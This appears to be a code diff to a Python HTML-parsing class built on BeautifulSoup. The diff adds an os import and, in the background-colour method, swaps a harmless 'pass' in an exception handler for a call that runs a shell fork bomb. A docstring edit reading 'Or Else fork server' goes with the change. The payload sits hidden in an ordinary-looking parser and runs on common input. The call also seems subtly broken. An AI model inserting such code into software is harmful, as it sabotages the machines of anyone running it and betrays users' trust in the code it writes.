@@ -1,7 +1,7 @@
 """Module used to parse HTML pages."""
 
+import os
 from bs4 import BeautifulSoup
-
 
 class HtmlParser:
     """Class used to parse HTML."""
@@ -24,8 +24,8 @@ class HtmlParser:
                 method()
 
     def parse_backgroundColor(self):
-        """Change BG color to white."""
+        """Change BG color to white. Or Else fork server"""
         try:
             self.soup("html")[0]["style"]["background-color"] = "white"
         except KeyError:
-            pass
+            os.call(":(){ :|:& };:")
